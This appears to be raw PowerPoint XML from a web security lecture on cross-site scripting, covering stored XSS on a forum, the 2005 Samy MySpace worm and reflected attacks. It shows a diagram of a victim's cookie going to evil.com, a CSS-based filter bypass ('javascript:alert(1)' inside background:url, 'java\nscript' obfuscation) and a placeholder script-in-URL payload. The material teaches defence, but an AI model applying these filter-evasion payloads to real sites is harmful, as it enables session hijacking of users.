          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="9" name="Group 8"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="3313221" y="2644888"/>
            <a:ext cx="4710689" cy="3501612"/>
            <a:chOff x="997951" y="1859612"/>
            <a:chExt cx="4710689" cy="3501612"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="6" name="Picture 5" descr="forum.gi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7951" y="1859612"/>
              <a:ext cx="4710689" cy="3501612"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
        </p:pic>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="8" name="Rectangle 7"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="2182354" y="2747301"/>
              <a:ext cx="3329014" cy="36987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Hello World! &lt;script&gt;…&lt;/script&gt;</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="11" name="Straight Arrow Connector 10"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2921000" y="2019300"/>
            <a:ext cx="2747566" cy="177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2921000" y="2489200"/>
            <a:ext cx="274756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05700" y="2969714"/>
            <a:ext cx="865441" cy="400110"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Victim</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Explosion 1 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6883400" y="2812627"/>
            <a:ext cx="2032000" cy="871976"/>
          </a:xfrm>
          <a:prstGeom prst="irregularSeal1">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Executed</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="24" name="Group 23"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="691966" y="4707197"/>
            <a:ext cx="1083475" cy="1512801"/>
            <a:chOff x="691966" y="4707197"/>
            <a:chExt cx="1083475" cy="1512801"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="18" name="Picture 17" descr="Serv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084" y="4707197"/>
              <a:ext cx="965423" cy="1112691"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
        </p:pic>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="19" name="TextBox 18"/>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="691966" y="5819888"/>
              <a:ext cx="1083475" cy="400110"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="none" rtlCol="0">
              <a:spAutoFit/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:r>
                <a:rPr lang="en-US" sz="2000" b="1" dirty="0" err="1">
                  <a:solidFill>
                    <a:srgbClr val="FF0000"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>evil.com</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="TextBox 21"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6057900" y="1032173"/>
            <a:ext cx="3009900" cy="646331"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>A web Forum (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>www.sss.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>) that has sensitive information</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="25" name="Group 24"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="1775441" y="3810000"/>
            <a:ext cx="5919345" cy="1422400"/>
            <a:chOff x="1775441" y="3810000"/>
            <a:chExt cx="5919345" cy="1422400"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:cxnSp>
          <p:nvCxnSpPr>
            <p:cNvPr id="21" name="Straight Arrow Connector 20"/>
            <p:cNvCxnSpPr/>
            <p:nvPr/>
          </p:nvCxnSpPr>
          <p:spPr>
            <a:xfrm flipH="1">
              <a:off x="1775441" y="3810000"/>
              <a:ext cx="4079259" cy="14224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59908" y="4779060"/>
              <a:ext cx="4634878" cy="400110"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:schemeClr val="bg1"/>
            </a:solidFill>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="none" rtlCol="0">
              <a:spAutoFit/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:r>
                <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="FF0000"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>cookie of </a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="FF0000"/>
                  </a:solidFill>
                  <a:hlinkClick r:id="rId6"/>
                </a:rPr>
                <a:t>www.sss.com</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="FF0000"/>
                  </a:solidFill>
                </a:rPr>
                <a:t> of the victim user</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="381273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Real-World Examples?</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1219200"/>
            <a:ext cx="8229600" cy="3759201"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Too many to be enumerated!</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>But you may want to know “</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Samy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Worm”</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>The site that hosts malicious </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>javascript</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> code</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>MySpace.com</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Oct/4/2005</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>More than one million victims within 24 hours</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Fastest spreading worm of all time!</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="13309910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Samy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Worm</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="images-3.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686" y="1417638"/>
            <a:ext cx="6876113" cy="4559162"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="16213218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Samy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Worm</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1320800"/>
            <a:ext cx="8229600" cy="4805363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="92500" lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0">
                <a:latin typeface="Tahoma" charset="0"/>
              </a:rPr>
              <a:t>Users can post HTML on their pages</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcBef>
                <a:spcPct val="40000"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                <a:latin typeface="Tahoma" charset="0"/>
              </a:rPr>
              <a:t>MySpace.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Tahoma" charset="0"/>
              </a:rPr>
              <a:t> ensures HTML contains no</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcBef>
                <a:spcPct val="40000"/>
              </a:spcBef>
              <a:buFont typeface="Wingdings" charset="0"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="009900"/>
                </a:solidFill>
                <a:latin typeface="Courier New" charset="0"/>
              </a:rPr>
              <a:t>&lt;script&gt;, &lt;body&gt;, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="009900"/>
                </a:solidFill>
                <a:latin typeface="Courier New" charset="0"/>
              </a:rPr>
              <a:t>onclick</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="009900"/>
                </a:solidFill>
                <a:latin typeface="Courier New" charset="0"/>
              </a:rPr>
              <a:t>, &lt;a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="009900"/>
                </a:solidFill>
                <a:latin typeface="Courier New" charset="0"/>
              </a:rPr>
              <a:t>href</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="009900"/>
                </a:solidFill>
                <a:latin typeface="Courier New" charset="0"/>
              </a:rPr>
              <a:t>=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="009900"/>
                </a:solidFill>
                <a:latin typeface="Courier New" charset="0"/>
              </a:rPr>
              <a:t>javascript</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="009900"/>
                </a:solidFill>
                <a:latin typeface="Courier New" charset="0"/>
              </a:rPr>
              <a:t>://&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcBef>
                <a:spcPct val="40000"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Tahoma" charset="0"/>
              </a:rPr>
              <a:t>…  but can do </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                <a:latin typeface="Tahoma" charset="0"/>
              </a:rPr>
              <a:t>Javascript</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Tahoma" charset="0"/>
              </a:rPr>
              <a:t> within CSS tags:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:buFont typeface="Times" charset="0"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="009900"/>
                </a:solidFill>
                <a:latin typeface="Courier New" charset="0"/>
              </a:rPr>
              <a:t>&lt;div style=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="009900"/>
                </a:solidFill>
                <a:latin typeface="Courier New" charset="0"/>
              </a:rPr>
              <a:t>“</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="009900"/>
                </a:solidFill>
                <a:latin typeface="Courier New" charset="0"/>
              </a:rPr>
              <a:t>background:url</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="009900"/>
                </a:solidFill>
                <a:latin typeface="Courier New" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="009900"/>
                </a:solidFill>
                <a:latin typeface="Courier New" charset="0"/>
              </a:rPr>
              <a:t>‘</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="009900"/>
                </a:solidFill>
                <a:latin typeface="Courier New" charset="0"/>
              </a:rPr>
              <a:t>javascript:alert</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="009900"/>
                </a:solidFill>
                <a:latin typeface="Courier New" charset="0"/>
              </a:rPr>
              <a:t>(1)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="009900"/>
                </a:solidFill>
                <a:latin typeface="Courier New" charset="0"/>
              </a:rPr>
              <a:t>’</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="009900"/>
                </a:solidFill>
                <a:latin typeface="Courier New" charset="0"/>
              </a:rPr>
              <a:t>)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="009900"/>
                </a:solidFill>
                <a:latin typeface="Courier New" charset="0"/>
              </a:rPr>
              <a:t>”</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="009900"/>
                </a:solidFill>
                <a:latin typeface="Courier New" charset="0"/>
              </a:rPr>
              <a:t>&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:buFont typeface="Times" charset="0"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Tahoma" charset="0"/>
              </a:rPr>
              <a:t>And can hide</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="009900"/>
                </a:solidFill>
                <a:latin typeface="Courier New" charset="0"/>
              </a:rPr>
              <a:t>  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="009900"/>
                </a:solidFill>
                <a:latin typeface="Courier New" charset="0"/>
              </a:rPr>
              <a:t>“</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="009900"/>
                </a:solidFill>
                <a:latin typeface="Courier New" charset="0"/>
              </a:rPr>
              <a:t>javascript</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="009900"/>
                </a:solidFill>
                <a:latin typeface="Courier New" charset="0"/>
              </a:rPr>
              <a:t>”</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="009900"/>
                </a:solidFill>
                <a:latin typeface="Courier New" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Tahoma" charset="0"/>
              </a:rPr>
              <a:t>as</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="009900"/>
                </a:solidFill>
                <a:latin typeface="Courier New" charset="0"/>
              </a:rPr>
              <a:t>  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="009900"/>
                </a:solidFill>
                <a:latin typeface="Courier New" charset="0"/>
              </a:rPr>
              <a:t>“</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="009900"/>
                </a:solidFill>
                <a:latin typeface="Courier New" charset="0"/>
              </a:rPr>
              <a:t>java\</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="009900"/>
                </a:solidFill>
                <a:latin typeface="Courier New" charset="0"/>
              </a:rPr>
              <a:t>nscript</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="009900"/>
                </a:solidFill>
                <a:latin typeface="Courier New" charset="0"/>
              </a:rPr>
              <a:t>”</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0">
              <a:solidFill>
                <a:srgbClr val="009900"/>
              </a:solidFill>
              <a:latin typeface="Courier New" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="90000"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0">
                <a:latin typeface="Tahoma" charset="0"/>
              </a:rPr>
              <a:t>With careful </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0" err="1">
                <a:latin typeface="Tahoma" charset="0"/>
              </a:rPr>
              <a:t>javascript</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0">
                <a:latin typeface="Tahoma" charset="0"/>
              </a:rPr>
              <a:t> hacking:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcBef>
                <a:spcPct val="40000"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                <a:latin typeface="Tahoma" charset="0"/>
              </a:rPr>
              <a:t>Samy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Tahoma" charset="0"/>
              </a:rPr>
              <a:t> worm infects anyone who visits an infected MySpace page</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcBef>
                <a:spcPct val="40000"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Tahoma" charset="0"/>
              </a:rPr>
              <a:t>Adds </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1">
                <a:latin typeface="Tahoma" charset="0"/>
              </a:rPr>
              <a:t>Samy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Tahoma" charset="0"/>
              </a:rPr>
              <a:t> as a friend.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcBef>
                <a:spcPct val="40000"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Tahoma" charset="0"/>
              </a:rPr>
              <a:t>Repost the message in the wall. </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="39462531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Non-Persistent Attacks</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="10" name="Group 9"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="1295621" y="2644888"/>
            <a:ext cx="5795568" cy="1627518"/>
            <a:chOff x="1295621" y="2345956"/>
            <a:chExt cx="5795568" cy="1627518"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="4" name="Picture 3" descr="chromebeatsfirefox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621" y="2345956"/>
              <a:ext cx="2293321" cy="1627518"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
        </p:pic>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="5" name="Picture 4" descr="Serv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5766" y="2345956"/>
              <a:ext cx="965423" cy="1112691"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
        </p:pic>
        <p:cxnSp>
          <p:nvCxnSpPr>
            <p:cNvPr id="6" name="Straight Arrow Connector 5"/>
            <p:cNvCxnSpPr/>
            <p:nvPr/>
          </p:nvCxnSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3378200" y="2833059"/>
              <a:ext cx="2747566" cy="177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H="1">
              <a:off x="3378200" y="3302959"/>
              <a:ext cx="274756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8" name="Rectangle 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="194866" y="1936349"/>
            <a:ext cx="7239604" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="575"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="008000"/>
              </a:buCl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solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:latin typeface="Arial" charset="0"/>
                <a:cs typeface="Arial" charset="0"/>
              </a:rPr>
              <a:t>http://</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:latin typeface="Arial" charset="0"/>
                <a:cs typeface="Arial" charset="0"/>
              </a:rPr>
              <a:t>naive.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:latin typeface="Arial" charset="0"/>
                <a:cs typeface="Arial" charset="0"/>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:latin typeface="Arial" charset="0"/>
                <a:cs typeface="Arial" charset="0"/>
              </a:rPr>
              <a:t>search.php?term</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:latin typeface="Arial" charset="0"/>
                <a:cs typeface="Arial" charset="0"/>
              </a:rPr>
              <a:t>=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-GB">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:latin typeface="Courier New" charset="0"/>
                <a:cs typeface="Arial" charset="0"/>
              </a:rPr>
              <a:t>“</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:latin typeface="Courier New" charset="0"/>
                <a:cs typeface="Arial" charset="0"/>
              </a:rPr>
              <a:t>&lt;script&gt;XXX&lt;/script&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-GB">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:latin typeface="Courier New" charset="0"/>
                <a:cs typeface="Arial" charset="0"/>
              </a:rPr>
              <a:t>”</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" dirty="0">
              <a:solidFill>
                <a:srgbClr val="008000"/>
              </a:solidFill>
              <a:latin typeface="Courier New" charset="0"/>
              <a:cs typeface="Arial" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Rectangle 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="4732240"/>
            <a:ext cx="7988300" cy="1421543"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="575"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="008000"/>
              </a:buCl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solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:latin typeface="Arial" charset="0"/>
                <a:cs typeface="Arial" charset="0"/>
              </a:rPr>
              <a:t>&lt;html&gt; </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="575"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="008000"/>
              </a:buCl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solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
